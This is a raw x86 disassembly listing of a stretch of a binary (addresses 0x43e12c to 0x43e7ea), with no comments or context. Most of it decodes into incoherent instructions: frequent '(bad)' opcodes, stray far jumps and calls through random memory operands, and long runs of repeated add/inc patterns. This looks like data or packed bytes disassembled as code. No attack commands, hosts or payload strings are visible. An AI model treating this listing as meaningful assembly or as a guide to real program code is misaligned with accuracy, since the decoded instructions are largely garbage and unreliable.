  43e12c:	add    BYTE PTR [ebp-0x1],al
  43e12f:	add    BYTE PTR [eax],al
  43e131:	sub    bh,bh
  43e133:	add    BYTE PTR [eax],al
  43e135:	sbb    bh,bh
  43e137:	add    BYTE PTR [eax],al
  43e139:	pop    ss
  43e13a:	inc    DWORD PTR [eax]
  43e13c:	add    BYTE PTR [ecx],bl
  43e13e:	inc    DWORD PTR [eax]
  43e140:	add    BYTE PTR [edi],bl
  43e142:	inc    DWORD PTR [eax]
  43e144:	add    BYTE PTR [ebx],dl
  43e146:	inc    DWORD PTR [eax]
  43e148:	add    BYTE PTR [edx],dl
  43e14a:	inc    DWORD PTR [eax]
  43e14c:	add    BYTE PTR [edi+edi*8],bl
  43e14f:	add    BYTE PTR [eax],al
  43e151:	xor    edi,edi
  43e153:	add    BYTE PTR [eax],al
  43e155:	push   edi
  43e156:	inc    DWORD PTR [eax]
  43e158:	add    BYTE PTR [ebp-0x20e6f301],al
  43e15e:	(bad)  
  43e15f:	fdivp  st(7),st
  43e161:	lock call FWORD PTR [edi-0x3b]
  43e165:	(bad)  
  43e167:	dec    ebp
  43e168:	mov    esp,0xc422ffd3
  43e16d:	sar    edi,cl
  43e16f:	jb     0x43e143
  43e171:	fdivr  st,st(7)
  43e173:	es xchg edx,eax
  43e175:	(bad)  
  43e176:	call   DWORD PTR [eax-0x45]
  43e179:	out    dx,eax
  43e17a:	inc    edi
  43e17c:	push   esp
  43e17e:	dec    DWORD PTR [ecx-0x52]
  43e181:	(bad)  
  43e182:	jmp    FWORD PTR [edx-0x48]
  43e185:	aad    0xff
  43e187:	xor    al,0x72
  43e189:	stos   BYTE PTR es:[edi],al
  43e18a:	jmp    DWORD PTR [ecx]
  43e18c:	push   ebx
  43e18d:	xchg   ecx,eax
  43e18e:	jmp    DWORD PTR [esi+edx*2]
  43e191:	xchg   edi,eax
  43e192:	call   FWORD PTR [esp+eax*8-0x23]
  43e196:	jmp    FWORD PTR [ebx]
  43e198:	(bad)
  43e19b:	sbb    BYTE PTR [eax-0x3e840039],cl
  43e1a1:	fcos   
  43e1a3:	xor    DWORD PTR [edi-0x67de0029],ebp
  43e1a9:	into   
  43e1aa:	jmp    DWORD PTR [edi]
  43e1ac:	xchg   ebx,eax
  43e1ad:	mov    edi,0xb45a00ff
  43e1b2:	call   FWORD PTR [ecx-0x1]
  43e1b5:	stc    
  43e1b6:	jmp    FWORD PTR [ebx]
  43e1b8:	cs sar bh,1
  43e1bb:	add    BYTE PTR [eax],al
  43e1bd:	test   eax,0x870000ff
  43e1c2:	inc    DWORD PTR [eax]
  43e1c4:	add    BYTE PTR [eax+0x790000ff],cl
  43e1ca:	inc    DWORD PTR [ecx]
  43e1cc:	add    DWORD PTR [ecx-0x1f739701],edx
  43e1d2:	jmp    FWORD PTR [eax-0x56]
  43e1d5:	sar    edi,1
  43e1d7:	add    BYTE PTR [edx],ch
  43e1d9:	fwait
  43e1da:	inc    DWORD PTR [edi-0x80]
  43e1dd:	mov    edi,0xc18a68ff
  43e1e2:	inc    DWORD PTR [ecx-0x75]
  43e1e5:	int3   
  43e1e6:	push   DWORD PTR [eax+edx*4]
  43e1e9:	aam    0xff
  43e1eb:	cmp    al,0x74
  43e1ed:	mov    edx,0xad6124ff
  43e1f2:	jmp    FWORD PTR ds:0x13ffc289
  43e1f8:	jno    0x43e1be
  43e1fa:	call   DWORD PTR [esi-0x5e]
  43e1fd:	sar    bh,cl
  43e1ff:	inc    edx
  43e200:	mov    al,ds:0xd759ffd7
  43e205:	jmp    0x37ff:0xdab74eff
  43e20c:	nop
  43e20d:	iret   
  43e20e:	inc    DWORD PTR [ecx+0x5effd7a3]
  43e214:	(bad)  
  43e215:	in     eax,dx
  43e216:	(bad)  
  43e217:	jle    0x43e20b
  43e219:	stc    
  43e21a:	inc    DWORD PTR [ecx]
  43e21c:	add    BYTE PTR [edx-0x78ffff01],ah
  43e222:	inc    DWORD PTR [eax]
  43e224:	add    BYTE PTR [edx-0x1],bl
  43e227:	add    BYTE PTR [eax],al
  43e229:	inc    ecx
  43e22a:	inc    DWORD PTR [eax]
  43e22c:	add    BYTE PTR [edi],ch
  43e22e:	inc    DWORD PTR [eax]
  43e230:	add    BYTE PTR [eax],ch
  43e232:	inc    DWORD PTR [eax]
  43e234:	add    BYTE PTR [eax],dh
  43e236:	inc    DWORD PTR [eax]
  43e238:	add    BYTE PTR [ebx],ch
  43e23a:	inc    DWORD PTR [eax]
  43e23c:	add    BYTE PTR [edx],bh
  43e23e:	inc    DWORD PTR [eax]
  43e240:	add    BYTE PTR ds:0x360000ff,bh
  43e246:	inc    DWORD PTR [eax]
  43e248:	add    BYTE PTR [edi+edi*8],dh
  43e24b:	add    BYTE PTR [eax],al
  43e24d:	and    eax,0x3e0000ff
  43e252:	inc    DWORD PTR [eax]
  43e254:	add    BYTE PTR [eax],dh
  43e256:	inc    DWORD PTR [eax]
  43e258:	add    BYTE PTR [eax],ah
  43e25a:	inc    DWORD PTR [eax]
  43e25c:	add    BYTE PTR [edi],ah
  43e25e:	inc    DWORD PTR [eax]
  43e260:	add    BYTE PTR [ebx],dh
  43e262:	inc    DWORD PTR [eax]
  43e264:	add    BYTE PTR [edi],dh
  43e266:	inc    DWORD PTR [eax]
  43e268:	add    BYTE PTR [edi+edi*8],ch
  43e26b:	add    BYTE PTR [eax],al
  43e26d:	inc    DWORD PTR ds:[eax]
  43e270:	add    BYTE PTR [ecx-0x1],ch
  43e273:	add    BYTE PTR [ebx],al
  43e275:	(bad)  
  43e276:	call   FWORD PTR [edi]
  43e278:	pop    edi
  43e279:	(bad)  
  43e27b:	mov    edi,0x76fffce0
  43e280:	loop   0x43e278
  43e282:	push   DWORD PTR [edi]
  43e284:	mov    cx,0x2cff
  43e288:	push   ebx
  43e289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e28a:	push   DWORD PTR ds:0x25ffb267
  43e290:	push   ebx
  43e291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e292:	call   FWORD PTR ds:0x1cff9141
  43e298:	cmp    BYTE PTR [edi+edi*8-0x76cae2],cl
  43e29f:	daa    
  43e2a0:	push   edx
  43e2a1:	mov    ds:0x9b4c28ff,eax
  43e2a6:	jmp    DWORD PTR [ecx]
  43e2a8:	push   edi
  43e2a9:	test   eax,0xbf8b36ff
  43e2ae:	dec    DWORD PTR [edx-0x71]
  43e2b1:	out    0xff,eax
  43e2b3:	add    BYTE PTR [esi],al
  43e2b5:	cdq    
  43e2b6:	inc    DWORD PTR [eax]
  43e2b8:	add    BYTE PTR [ebx-0x1],ah
  43e2bb:	add    BYTE PTR [eax],al
  43e2bd:	dec    esi
  43e2be:	inc    DWORD PTR [eax]
  43e2c0:	add    BYTE PTR [edi],bh
  43e2c2:	inc    DWORD PTR [eax]
  43e2c4:	add    BYTE PTR [edi-0x1],al
  43e2c7:	add    BYTE PTR [eax],al
  43e2c9:	push   ebx
  43e2ca:	inc    DWORD PTR [eax]
  43e2cc:	add    BYTE PTR [edx-0x1],dh
  43e2cf:	add    BYTE PTR [eax],al
  43e2d1:	xchg   esp,eax
  43e2d2:	inc    DWORD PTR [eax+ecx*1]
  43e2d5:	mov    eax,0xddaf7aff
  43e2da:	(bad)  
  43e2db:	jns    0x43e2a2
  43e2dd:	(bad)  
  43e2df:	outs   dx,DWORD PTR ds:[esi]
  43e2e0:	(bad)  
  43e2e1:	jecxz  0x43e2e2
  43e2e3:	cmp    al,0xd7
  43e2e5:	call   0xd1cc0de9
  43e2ea:	dec    DWORD PTR [edi-0x65]
  43e2ed:	sar    bh,1
  43e2ef:	dec    edx
  43e2f0:	sahf   
  43e2f1:	aam    0xff
  43e2f3:	dec    esp
  43e2f4:	mov    ds:0xbe54ffd4,eax
  43e2f9:	loope  0x43e2fa
  43e2fb:	sbb    ebx,DWORD PTR [esi-0x40]
  43e2fe:	call   DWORD PTR [edi]
  43e300:	mov    cl,ah
  43e302:	jmp    FWORD PTR [edx+ebp*2]
  43e305:	mov    ecx,0xaa491dff
  43e30a:	jmp    DWORD PTR [eax]
  43e30c:	dec    esp
  43e30d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e30e:	jmp    FWORD PTR ds:0xfff5da
  43e314:	xor    BYTE PTR [ecx-0x15416401],dh
  43e31a:	inc    edx
  43e31c:	(bad)  
  43e31d:	(bad)  
  43e31e:	inc    DWORD PTR [eax]
  43e320:	sbb    eax,0xffeb
  43e325:	cdq    
  43e326:	inc    DWORD PTR [eax]
  43e328:	add    BYTE PTR [eax-0x1],ch
  43e32b:	add    BYTE PTR [eax],al
  43e32d:	dec    ecx
  43e32e:	inc    DWORD PTR [eax]
  43e330:	add    BYTE PTR [esi],ah
  43e332:	inc    DWORD PTR [eax]
  43e334:	add    BYTE PTR [edi],bl
  43e336:	inc    DWORD PTR [eax]
  43e338:	add    BYTE PTR [edx],dl
  43e33a:	inc    DWORD PTR [eax]
  43e33c:	add    BYTE PTR [eax],bl
  43e33e:	inc    DWORD PTR [eax]
  43e340:	add    BYTE PTR [edi+edi*8],dl
  43e343:	add    BYTE PTR [eax],al
  43e345:	adc    bh,bh
  43e347:	add    BYTE PTR [eax],al
  43e349:	push   cs
  43e34a:	inc    DWORD PTR [eax]
  43e34c:	add    BYTE PTR [edx],bl
  43e34e:	inc    DWORD PTR [eax]
  43e350:	add    BYTE PTR [ecx],ch
  43e352:	inc    DWORD PTR [eax]
  43e354:	add    BYTE PTR [edx-0x1],dl
  43e357:	add    BYTE PTR [eax],al
  43e359:	xchg   edi,edi
  43e35b:	push   cs
  43e35c:	sbb    bh,dl
  43e35e:	call   esi
  43e360:	push   edx
  43e362:	(bad)  
  43e363:	cmp    eax,0x6affc696
  43e368:	mov    ebp,0xd268ffd8
  43e36d:	fdiv   st(7),st
  43e36f:	ins    BYTE PTR es:[edi],dx
  43e370:	retf   
  43e371:	xlat   BYTE PTR ds:[ebx]
  43e372:	jmp    DWORD PTR [edx]
  43e374:	mov    ds:0xc857ffd6,al
  43e379:	clc    
  43e37a:	inc    ebp
  43e37c:	push   eax
  43e37e:	dec    DWORD PTR [esi-0x46]
  43e381:	(bad)  
  43e382:	dec    DWORD PTR [edx+ebx*4-0x39]
  43e386:	jmp    DWORD PTR [ecx+edi*2]
  43e389:	sar    edi,0x26
  43e38c:	je     0x43e340
  43e38e:	jmp    FWORD PTR [eax]
  43e390:	arpl   WORD PTR [ecx-0x5ba5e101],sp
  43e396:	call   DWORD PTR [ebx+esi*4]
  43e399:	sar    bh,1
  43e39b:	sub    eax,0x4dffdcba
  43e3a0:	ret    
  43e3a1:	(bad)  
  43e3a3:	and    bl,BYTE PTR [esi-0x7de10030]
  43e3a9:	(bad)  
  43e3aa:	jmp    FWORD PTR [ebx]
  43e3ac:	mov    bl,al
  43e3ae:	(bad)  
  43e3af:	js     0x43e37e
  43e3b1:	(bad)  
  43e3b3:	(bad)  
  43e3b4:	out    0xf1,al
  43e3b6:	inc    DWORD PTR [edx]
  43e3b8:	or     cl,al
  43e3ba:	inc    DWORD PTR [eax]
  43e3bc:	add    BYTE PTR [ebx+0x7d0000ff],cl
  43e3c2:	inc    DWORD PTR [eax]
  43e3c4:	add    BYTE PTR [edi-0x1],ah
  43e3c7:	add    BYTE PTR [eax],al
  43e3c9:	ins    BYTE PTR es:[edi],dx
  43e3ca:	inc    DWORD PTR [edx+ecx*1]
  43e3cd:	mov    ?,edi
  43e3cf:	jbe    0x43e3a3
  43e3d1:	stc    
  43e3d2:	dec    DWORD PTR [esi-0x3c]
  43e3d5:	out    0xff,eax
  43e3d7:	(bad)
  43e3db:	inc    edx
  43e3dc:	mov    ebx,ss
  43e3de:	call   FWORD PTR [ebx-0x4a]
  43e3e1:	loopne 0x43e3e2
  43e3e3:	push   eax
  43e3e4:	lods   al,BYTE PTR ds:[esi]
  43e3e5:	aam    0xff
  43e3e7:	push   0xffffffca
  43e3e9:	in     al,dx
  43e3ea:	push   DWORD PTR [ebx-0x3b]
  43e3ed:	call   0xd8fc59f1
  43e3f2:	push   DWORD PTR [eax]
  43e3f4:	mov    edx,eax
  43e3f6:	inc    DWORD PTR [eax]
  43e3f8:	inc    eax
  43e3f9:	mov    ecx,0xd08d1dff
  43e3fe:	jmp    FWORD PTR [ecx-0x52]
  43e401:	fdivr  st,st(7)
  43e403:	push   esp
  43e404:	(bad)  
  43e405:	in     eax,0xff
  43e407:	dec    esi
  43e408:	mov    edx,0x9b45ffdf
  43e40d:	iret   
  43e40e:	call   DWORD PTR [ebx-0x62]
  43e411:	sar    edi,cl
  43e413:	fwait
  43e414:	jmp    0x9e91e411
  43e419:	cmc    
  43e41a:	inc    DWORD PTR [ecx]
  43e41c:	add    al,0xa8
  43e41e:	inc    DWORD PTR [eax]
  43e420:	add    BYTE PTR [ecx-0x1],bh
  43e423:	add    BYTE PTR [eax],al
  43e425:	push   esp
  43e426:	inc    DWORD PTR [eax]
  43e428:	add    BYTE PTR [ecx-0x1],cl
  43e42b:	add    BYTE PTR [eax],al
  43e42d:	and    al,0xff
  43e42f:	add    BYTE PTR [eax],al
  43e431:	sub    eax,0x330000ff
  43e436:	inc    DWORD PTR [eax]
  43e438:	add    BYTE PTR [edx],ch
  43e43a:	inc    DWORD PTR [eax]
  43e43c:	add    BYTE PTR [ebx],ch
  43e43e:	inc    DWORD PTR [eax]
  43e440:	add    BYTE PTR [esi],ah
  43e442:	inc    DWORD PTR [eax]
  43e444:	add    BYTE PTR [eax],bh
  43e446:	inc    DWORD PTR [eax]
  43e448:	add    BYTE PTR [edi],bh
  43e44a:	inc    DWORD PTR [eax]
  43e44c:	add    BYTE PTR [ebx],ch
  43e44e:	inc    DWORD PTR [eax]
  43e450:	add    BYTE PTR [edi+edi*8],bh
  43e453:	add    BYTE PTR [eax],al
  43e455:	sub    edi,edi
  43e457:	add    BYTE PTR [eax],al
  43e459:	xor    edi,edi
  43e45b:	add    BYTE PTR [eax],al
  43e45d:	sub    edi,edi
  43e45f:	add    BYTE PTR [eax],al
  43e461:	xor    edi,edi
  43e463:	add    BYTE PTR [eax],al
  43e465:	sub    bh,bh
  43e467:	add    BYTE PTR [eax],al
  43e469:	xor    bh,bh
  43e46b:	add    BYTE PTR [eax],al
  43e46d:	cmp    edi,edi
  43e46f:	add    BYTE PTR [eax],al
  43e471:	pop    ecx
  43e472:	inc    DWORD PTR [eax]
  43e474:	add    BYTE PTR [eax-0x1],bh
  43e477:	add    BYTE PTR [eax],al
  43e479:	mov    ebx,0xfd0000ff
  43e47e:	jmp    FWORD PTR [ebp-0x33]
  43e481:	(bad)  
  43e482:	call   FWORD PTR [ecx-0x3f]
  43e485:	(bad)  
  43e486:	(bad)  
  43e487:	cmp    ch,BYTE PTR [esi-0x46]
  43e48a:	(bad)  
  43e48b:	cmp    bh,BYTE PTR [esi-0x39]
  43e48e:	jmp    FWORD PTR [ebx+edx*2]
  43e491:	sahf   
  43e492:	jmp    FWORD PTR [ecx]
  43e494:	push   esp
  43e495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e496:	call   FWORD PTR [esp+edi*1]
  43e499:	mov    ?,edi
  43e49b:	pop    ss
  43e49c:	xor    edi,DWORD PTR [esi-0x1]
  43e49f:	push   ds
  43e4a0:	xor    BYTE PTR [eax-0x1],bh
  43e4a3:	and    al,BYTE PTR [edx-0x6b]
  43e4a6:	jmp    DWORD PTR [ecx]
  43e4a8:	imul   esi,DWORD PTR [edi+edi*8-0x142589],0xfffdf0ad
  43e4b3:	or     dl,BYTE PTR [edx]
  43e4b5:	(bad)  
  43e4b6:	inc    DWORD PTR [eax]
  43e4b8:	add    BYTE PTR [edi-0x1],bl
  43e4bb:	add    BYTE PTR [eax],al
  43e4bd:	inc    ecx
  43e4be:	inc    DWORD PTR [eax]
  43e4c0:	add    BYTE PTR ds:0x390000ff,bh
  43e4c6:	inc    DWORD PTR [eax]
  43e4c8:	add    BYTE PTR [esi],bh
  43e4ca:	inc    DWORD PTR [eax]
  43e4cc:	add    BYTE PTR [esi-0x1],dl
  43e4cf:	add    BYTE PTR [eax],al
  43e4d1:	outs   dx,BYTE PTR ds:[esi]
  43e4d2:	inc    DWORD PTR [eax]
  43e4d4:	add    BYTE PTR [ecx-0x4ef5fd01],cl
  43e4da:	inc    DWORD PTR [ecx-0x73]
  43e4dd:	fcos   
  43e4df:	pop    eax
  43e4e0:	pushf  
  43e4e1:	(bad)  
  43e4e4:	test   esp,eax
  43e4e6:	jmp    FWORD PTR [eax]
  43e4e8:	ins    BYTE PTR es:[edi],dx
  43e4e9:	enter  0x51ff,0x9d
  43e4ed:	fdivr  st,st(7)
  43e4ef:	dec    edx
  43e4f0:	xchg   edi,eax
  43e4f1:	int    0xff
  43e4f3:	push   edx
  43e4f4:	scas   eax,DWORD PTR es:[edi]
  43e4f5:	fdivr  st,st(7)
  43e4f7:	dec    ebp
  43e4f8:	call   0xffda:0x9e3effd0
  43e4ff:	and    esi,DWORD PTR [esi-0x35]
  43e502:	call   FWORD PTR [edi]
  43e504:	popa   
  43e505:	mov    dl,0xff
  43e507:	pop    ss
  43e508:	aas    
  43e509:	pushf  
  43e50a:	jmp    DWORD PTR [eax]
  43e50c:	push   edx
  43e50d:	stos   BYTE PTR es:[edi],al
  43e50e:	jmp    FWORD PTR [ebx]
  43e510:	mov    esi,0x6010fff3
  43e515:	mov    esi,0xd6540aff
  43e51a:	(bad)  
  43e51b:	mov    edx,0x82ffffff
  43e520:	int    0xfd
  43e522:	inc    DWORD PTR [eax]
  43e524:	add    BYTE PTR [edi+0x7b0000ff],bh
  43e52a:	inc    DWORD PTR [eax]
  43e52c:	add    BYTE PTR [edi+edi*8+0x0],dl
  43e530:	add    BYTE PTR [edi],dh
  43e532:	inc    DWORD PTR [eax]
  43e534:	add    BYTE PTR [esi],bl
  43e536:	inc    DWORD PTR [eax]
  43e538:	add    BYTE PTR [eax],dl
  43e53a:	inc    DWORD PTR [eax]
  43e53c:	add    BYTE PTR ds:0x190000ff,dl
  43e542:	inc    DWORD PTR [eax]
  43e544:	add    BYTE PTR [esi],cl
  43e546:	inc    DWORD PTR [eax]
  43e548:	add    BYTE PTR [eax],dl
  43e54a:	inc    DWORD PTR [eax]
  43e54c:	add    BYTE PTR [edx],bl
  43e54e:	inc    DWORD PTR [eax]
  43e550:	add    BYTE PTR [edi+edi*8],ch
  43e553:	add    BYTE PTR [eax],al
  43e555:	dec    edi
  43e556:	inc    DWORD PTR [eax]
  43e558:	add    BYTE PTR [edi+edi*8+0x4],bh
  43e55c:	pop    es
  43e55d:	(bad)  
  43e55e:	jmp    DWORD PTR [eax+0x38ffeee9]
  43e564:	mov    BYTE PTR [ebx-0x3050a401],bh
  43e56a:	call   FWORD PTR [edi-0x51]
  43e56d:	into   
  43e56e:	(bad)  
  43e56f:	cmp    al,BYTE PTR [eax+0x7820ffad]
  43e575:	sar    edi,0x42
  43e578:	sar    cl,1
  43e57a:	dec    edi
  43e57c:	(bad)  
  43e57d:	out    dx,eax
  43e57e:	(bad)  
  43e57f:	cmp    al,0xc6
  43e581:	fdivp  st(7),st
  43e583:	and    al,0x97
  43e585:	leave  
  43e586:	dec    DWORD PTR [esi]
  43e588:	retw   0x25ff
  43e58c:	mov    ecx,edi
  43e58e:	inc    DWORD PTR [ecx+eax*2]
  43e591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e592:	inc    DWORD PTR [eax]
  43e594:	xor    eax,0x8929ffa0
  43e599:	ret    0x2aff
  43e59c:	xchg   edx,eax
  43e59d:	enter  0x20ff,0x95
  43e5a1:	enter  0x1dff,0xb8
  43e5a5:	loop   0x43e5a6
  43e5a7:	inc    eax
  43e5a8:	mov    ecx,0x8135ffdf
  43e5ad:	mov    ebx,0xedfa89ff
  43e5b2:	push   DWORD PTR [edi]
  43e5b4:	je     0x43e589
  43e5b6:	inc    DWORD PTR [eax]
  43e5b8:	add    BYTE PTR [eax+0x710000ff],ch
  43e5be:	inc    DWORD PTR [eax]
  43e5c0:	add    BYTE PTR [ecx-0x1],bl
  43e5c3:	add    BYTE PTR [eax],al
  43e5c5:	dec    eax
  43e5c6:	inc    DWORD PTR [eax]
  43e5c8:	add    BYTE PTR [edi+edi*8+0x5],dl
  43e5cc:	or     al,0x79
  43e5ce:	jmp    FWORD PTR [edi]
  43e5d0:	pop    esi
  43e5d1:	sar    edi,cl
  43e5d3:	and    esp,DWORD PTR [edi]
  43e5d5:	(bad)  
  43e5d6:	push   DWORD PTR [ecx]
  43e5d8:	inc    esp
  43e5d9:	retf   0x22ff
  43e5dc:	sub    esi,DWORD PTR [edi+edi*8-0x39c6d9]
  43e5e3:	and    eax,0xeffbe38
  43e5e8:	adc    dl,al
  43e5ea:	dec    DWORD PTR [edx+eax*4-0x19]
  43e5ee:	push   DWORD PTR [edi+0xffff3fe]
  43e5f4:	jp     0x43e5b1
  43e5f6:	inc    DWORD PTR [eax]
  43e5f8:	dec    edx
  43e5f9:	mov    ch,0xff
  43e5fb:	add    BYTE PTR [ebp-0x6ebe0044],al
  43e601:	(bad)  
  43e602:	jmp    DWORD PTR [edx-0x4b]
  43e605:	fdivp  st(7),st
  43e607:	dec    esi
  43e608:	mov    eax,0x2f14ffe1
  43e60d:	into   
  43e60e:	inc    DWORD PTR [esi]
  43e610:	push   cs
  43e611:	retf   0x15ff
  43e614:	sub    ebp,eax
  43e616:	inc    DWORD PTR [edi]
  43e618:	push   cs
  43e619:	ret    
  43e61a:	inc    DWORD PTR [eax]
  43e61c:	add    BYTE PTR [edi+0x730000ff],dl
  43e622:	inc    DWORD PTR [eax]
  43e624:	add    BYTE PTR [edi+edi*8+0x0],cl
  43e628:	add    BYTE PTR [edi+edi*8],bh
  43e62b:	add    BYTE PTR [eax],al
  43e62d:	xor    bh,bh
  43e62f:	add    BYTE PTR [eax],al
  43e631:	sub    edi,edi
  43e633:	add    BYTE PTR [eax],al
  43e635:	sub    bh,bh
  43e637:	add    BYTE PTR [eax],al
  43e639:	and    eax,0x330000ff
  43e63e:	inc    DWORD PTR [eax]
  43e640:	add    BYTE PTR ds:0x340000ff,dh
  43e646:	inc    DWORD PTR [eax]
  43e648:	add    BYTE PTR [ecx],dh
  43e64a:	inc    DWORD PTR [eax]
  43e64c:	add    BYTE PTR [edi],ch
  43e64e:	inc    DWORD PTR [eax]
  43e650:	add    BYTE PTR [edi],bh
  43e652:	inc    DWORD PTR [eax]
  43e654:	add    BYTE PTR [eax],dh
  43e656:	inc    DWORD PTR [eax]
  43e658:	add    BYTE PTR [edx],bh
  43e65a:	inc    DWORD PTR [eax]
  43e65c:	add    BYTE PTR ds:0x330000ff,ch
  43e662:	inc    DWORD PTR [eax]
  43e664:	add    BYTE PTR [ecx],dh
  43e666:	inc    DWORD PTR [eax]
  43e668:	add    BYTE PTR [edi+edi*8],dh
  43e66b:	add    BYTE PTR [eax],al
  43e66d:	cmp    al,0xff
  43e66f:	add    BYTE PTR [eax],al
  43e671:	push   ebp
  43e672:	inc    DWORD PTR [eax]
  43e674:	add    BYTE PTR [edx-0x1],dh
  43e677:	add    BYTE PTR [eax],al
  43e679:	fwait
  43e67a:	inc    DWORD PTR [eax]
  43e67c:	add    bl,bl
  43e67e:	dec    DWORD PTR [ecx]
  43e680:	dec    ebp
  43e681:	(bad)  
  43e682:	push   DWORD PTR [ebp-0x2]
  43e685:	cli    
  43e686:	jmp    DWORD PTR [eax-0x51]
  43e689:	(bad)  
  43e68a:	push   DWORD PTR [edi]
  43e68c:	outs   dx,DWORD PTR ds:[esi]
  43e68d:	mov    ebx,0x9a4b24ff
  43e692:	jmp    DWORD PTR [edx]
  43e694:	dec    eax
  43e695:	lahf   
  43e696:	call   DWORD PTR [edx]
  43e698:	sub    eax,0x2613ff70
  43e69d:	ins    DWORD PTR es:[edi],dx
  43e69e:	call   FWORD PTR ds:0x1fff8937
  43e6a4:	inc    esp
  43e6a5:	cwde   
  43e6a6:	dec    DWORD PTR [eax-0x36]
  43e6a9:	jmp    0x3cff:0xeea383ff
  43e6b0:	inc    esi
  43e6b1:	(bad)  
  43e6b2:	inc    DWORD PTR [edi+eax*1]
  43e6b5:	cmp    bh,0x0
  43e6b8:	add    BYTE PTR [ebp-0x1],bl
  43e6bb:	add    BYTE PTR [eax],al
  43e6bd:	xor    edi,edi
  43e6bf:	add    BYTE PTR [eax],al
  43e6c1:	xor    bh,bh
  43e6c3:	add    BYTE PTR [eax],al
  43e6c5:	sub    eax,0x260000ff
  43e6ca:	inc    DWORD PTR [eax]
  43e6cc:	add    BYTE PTR ds:0x460000ff,bh
  43e6d2:	inc    DWORD PTR [eax]
  43e6d4:	add    BYTE PTR [edi+edi*8+0x0],ah
  43e6d8:	add    BYTE PTR [ebp-0x42def501],al
  43e6de:	jmp    DWORD PTR [ecx-0x3a]
  43e6e1:	out    0xff,eax
  43e6e3:	aas    
  43e6e4:	test   edx,eax
  43e6e6:	jmp    DWORD PTR [ebx]
  43e6e8:	fs (bad) 
  43e6ea:	push   DWORD PTR [edx]
  43e6ec:	outs   dx,DWORD PTR ds:[esi]
  43e6ed:	iret   
  43e6ee:	inc    DWORD PTR [edi-0x77]
  43e6f1:	retf   
  43e6f2:	inc    DWORD PTR [edx+ecx*4-0x34]
  43e6f6:	dec    DWORD PTR [ecx-0x62]
  43e6f9:	sar    edi,1
  43e6fb:	aas    
  43e6fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e6fd:	(bad)  
  43e6fe:	jmp    DWORD PTR [ecx]
  43e700:	inc    edi
  43e701:	mov    ch,0xff
  43e703:	and    bl,BYTE PTR [ebx-0x49]
  43e706:	call   DWORD PTR [edx]
  43e708:	xor    BYTE PTR [ecx-0x459bde01],al
  43e70e:	jmp    FWORD PTR [eax]
  43e710:	mov    esi,ss
  43e712:	call   FWORD PTR [esi]
  43e714:	imul   eax,ebx,0xffffffff
  43e717:	add    BYTE PTR ds:0x9445ffc8,bl
  43e71d:	lock dec esi
  43e720:	(bad)  
  43e721:	(bad)  
  43e722:	call   FWORD PTR [ecx]
  43e724:	push   ds
  43e725:	loop   0x43e726
  43e727:	add    BYTE PTR [eax],al
  43e729:	nop
  43e72a:	inc    DWORD PTR [eax]
  43e72c:	add    BYTE PTR [ebx-0x1],ah
  43e72f:	add    BYTE PTR [eax],al
  43e731:	inc    DWORD PTR ds:[eax]
  43e734:	add    BYTE PTR [edi+edi*8],ah
  43e737:	add    BYTE PTR [eax],al
  43e739:	push   ds
  43e73a:	inc    DWORD PTR [eax]
  43e73c:	add    BYTE PTR [ebx],bl
  43e73e:	inc    DWORD PTR [eax]
  43e740:	add    BYTE PTR [esi],dl
  43e742:	inc    DWORD PTR [eax]
  43e744:	add    BYTE PTR [edi+edi*8],cl
  43e747:	add    BYTE PTR [eax],al
  43e749:	adc    eax,0x120000ff
  43e74e:	inc    DWORD PTR [eax]
  43e750:	add    BYTE PTR [edx],ch
  43e752:	inc    DWORD PTR [eax]
  43e754:	add    BYTE PTR [eax-0x1],cl
  43e757:	add    BYTE PTR [eax],al
  43e759:	jnp    0x43e75a
  43e75b:	add    DWORD PTR [eax],eax
  43e75d:	(bad)  
  43e75e:	call   DWORD PTR [eax+0x2dffebd7]
  43e764:	ja     0x43e716
  43e766:	dec    DWORD PTR [edx-0x66]
  43e769:	enter  0x49ff,0x9e
  43e76d:	(bad)  
  43e76e:	(bad)  
  43e76f:	cmp    edi,DWORD PTR [ebx-0x4a]
  43e772:	jmp    DWORD PTR [esi]
  43e774:	test   BYTE PTR [esi-0x2d62d501],bh
  43e77a:	call   DWORD PTR [ecx-0x2c]
  43e77d:	(bad)  
  43e77f:	adc    bl,BYTE PTR [ecx+0x6610ffc9]
  43e785:	lods   al,BYTE PTR ds:[esi]
  43e786:	inc    DWORD PTR [ecx*2+0x6b25ffa6]
  43e78d:	mov    ch,0xff
  43e78f:	add    BYTE PTR [ecx],ah
  43e791:	test   bh,bh
  43e793:	ss pop ebx
  43e795:	test   al,0xff
  43e797:	xor    DWORD PTR [ebp-0x44],ebp
  43e79a:	jmp    FWORD PTR [eax]
  43e79c:	lods   al,BYTE PTR ds:[esi]
  43e79d:	aam    0xff
  43e79f:	daa    
  43e7a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e7a1:	int    0xff
  43e7a3:	and    ecx,DWORD PTR [esi-0x47b1002b]
  43e7a9:	in     eax,0xff
  43e7ab:	add    dl,cl
  43e7ad:	fcos   
  43e7af:	outs   dx,DWORD PTR ds:[esi]
  43e7b0:	(bad)  
  43e7b1:	(bad)  
  43e7b2:	call   DWORD PTR [ebx]
  43e7b4:	adc    edi,DWORD PTR [ebx-0x77ffff01]
  43e7ba:	inc    DWORD PTR [eax]
  43e7bc:	add    BYTE PTR [eax-0x1],ah
  43e7bf:	add    BYTE PTR [eax],al
  43e7c1:	inc    ebp
  43e7c2:	inc    DWORD PTR [eax]
  43e7c4:	add    BYTE PTR [esi],bh
  43e7c6:	inc    DWORD PTR [eax]
  43e7c8:	add    BYTE PTR [edi-0x1],al
  43e7cb:	add    DWORD PTR [ebx],eax
  43e7cd:	push   ebp
  43e7ce:	inc    DWORD PTR [edx]
  43e7d0:	add    esi,DWORD PTR [ebp-0x1]
  43e7d3:	add    al,BYTE PTR [ebx]
  43e7d5:	xchg   bh,bh
  43e7d7:	add    al,BYTE PTR [ebx]
  43e7d9:	cdq    
  43e7da:	inc    DWORD PTR [edx]
  43e7dc:	add    esi,DWORD PTR [eax-0x3afcfd01]
  43e7e2:	inc    DWORD PTR [edx]
  43e7e4:	add    ecx,esp
  43e7e6:	inc    DWORD PTR [eax]
  43e7e8:	add    dl,ch
  43e7ea:	dec    DWORD PTR [edx]
